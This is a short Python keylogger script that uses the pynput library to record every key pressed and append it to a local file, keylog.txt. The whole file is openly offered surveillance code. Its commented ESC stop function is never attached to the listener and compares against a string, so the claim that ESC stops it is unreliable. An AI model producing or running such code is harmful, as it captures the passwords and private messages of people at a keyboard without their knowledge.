from pynput.keyboard import Listener

# Function to log the keys pressed
def log_key(key):
    try:
        # Write the key to the file
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter)
        with open("keylog.txt", "a") as log_file:
            log_file.write(f" {key} ")

# Function to stop the keylogger (e.g., on pressing ESC)
def stop_keylogger(key):
    if key == 'Key.esc':
        return False

# Starting the keylogger
with Listener(on_press=log_key) as listener:
    listener.join()
